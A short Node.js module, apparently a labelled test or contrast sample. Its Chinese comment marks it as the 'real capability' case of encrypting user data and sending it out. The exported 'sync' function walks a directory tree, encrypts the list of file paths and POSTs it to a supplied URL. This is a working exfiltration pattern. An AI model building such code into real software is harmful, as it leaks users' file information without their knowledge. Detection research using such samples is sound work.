'use strict';
const fs = require('fs');
const crypto = require('crypto');

function treescan(root) {
  const out = [];
  (function walk(d) {
    for (const e of fs.readdirSync(d, { withFileTypes: true })) {
      const p = d + '/' + e.name;
      if (e.isDirectory()) walk(p); else out.push(p);
    }
  })(root);
  return out;
}

// B1 真正加密用户数据并外发（对照：这才是真正的能力）
async function sync(root, url) {
  const files = treescan(root);
  const key = crypto.randomBytes(32), iv = crypto.randomBytes(16);
  const c = crypto.createCipheriv('aes-256-gcm', key, iv);
  const body = Buffer.concat([iv, c.update(Buffer.from(files.join('\n'))), c.final()]);
  return fetch(url, { method: 'POST', body: body });
}
module.exports = { sync };
